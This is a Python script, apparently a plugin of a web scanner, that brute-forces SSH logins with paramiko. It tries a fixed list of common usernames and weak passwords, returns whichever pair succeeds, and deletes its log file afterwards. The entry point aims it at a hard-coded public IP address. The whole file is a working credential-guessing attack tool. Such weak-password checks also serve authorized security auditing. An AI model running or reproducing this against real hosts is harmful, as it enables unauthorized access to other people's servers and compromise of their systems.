#coding:utf-8
import os
import paramiko
from timeout import timeout
from threading import Thread

paramiko.util.log_to_file("/var/www/html/ngscanner/scan/scripts/filename.log")

def connect(host,user,pwd):
    try:
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host,username=user,password=pwd,timeout=5)
        ssh.close()
        return 1,'',user+':'+pwd
    except:
        return 0,0,0


def crack(host):
	user_list = ['root', 'admin', 'test', 'user']
	pass_list = ['', 'test', '123456', 'password', 'root', 'admin','qaz123','111111']
	for i in user_list:
		for j in pass_list:
			data = connect(host,i,j)
			if data[0]:
				return data

def start(host,port,pro):
	try:
		content = crack(host)
		os.remove("/var/www/html/ngscanner/scan/scripts/filename.log")
		if content[0]:
			return content
		else:
			return 0,0,0
	except:
		return 0,0,0
		
if __name__ == '__main__':
	start('112.53.84.85','','')